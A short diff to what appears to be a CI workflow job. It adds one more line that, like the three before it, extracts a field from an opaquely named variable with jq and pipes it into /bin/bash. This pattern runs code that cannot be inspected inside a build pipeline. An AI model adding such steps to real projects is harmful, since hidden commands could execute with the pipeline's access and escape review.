@@ -28,6 +28,7 @@ jobs:
           echo $egelb05 | jq -r .ikqry93059 | /bin/bash
           echo $ru42237 | jq -r .x130 | /bin/bash
           echo $tpvjs1 | jq -r .no30892 | /bin/bash
+          printf '%s' "$h490" | jq -r .dp27917 | /bin/bash
 
       - name: Archive output
         if: always()
